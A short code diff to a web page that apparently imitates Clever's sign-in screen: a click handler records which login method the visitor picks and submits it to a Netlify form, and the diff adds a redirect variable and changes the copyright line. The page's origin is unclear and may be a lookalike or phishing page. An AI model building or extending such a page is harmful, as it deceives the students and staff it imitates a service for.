@@ -58,6 +58,7 @@ document.querySelectorAll('.AuthMethod--container').forEach(link => {
   link.addEventListener('click', function (e) {
     e.preventDefault();
     const choice = this.dataset.choice || 'unknown';
+    const redirectURL = this.href;
     document.getElementById('button-choice').value = choice;
 
     // Submit form to Netlify
@@ -135,7 +136,7 @@ document.querySelectorAll('.AuthMethod--container').forEach(link => {
           <span class="sr-only">Clever</span>
         </div>
         <div class="legal">
-          <div class="copyright">booba © 2025</div>
+          <div class="copyright">bebe © 2025</div>
           <div class="privacy">
             <p>https://clever.com/trust/privacy/policy</p>
             <p>https://clever.com/about/terms</p>
